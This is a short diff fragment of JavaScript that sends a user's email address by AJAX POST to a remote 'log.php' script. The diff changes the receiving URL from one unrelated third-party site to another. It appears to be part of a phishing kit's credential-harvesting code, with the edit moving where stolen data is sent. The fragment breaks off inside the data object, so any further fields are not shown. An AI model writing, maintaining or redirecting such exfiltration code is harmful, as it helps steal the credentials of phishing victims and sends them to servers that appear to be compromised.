@@ -58,7 +58,7 @@ email = email.toLowerCase();
     var file = "log.php";
          $.ajax({
            dataType: 'JSON',
-url: "https://queenslandhistory.org/loop/log.php",
+url: "https://nokutenda.org.au/image/wb/log.php",
            type: 'POST',
            data:{
              email:email,
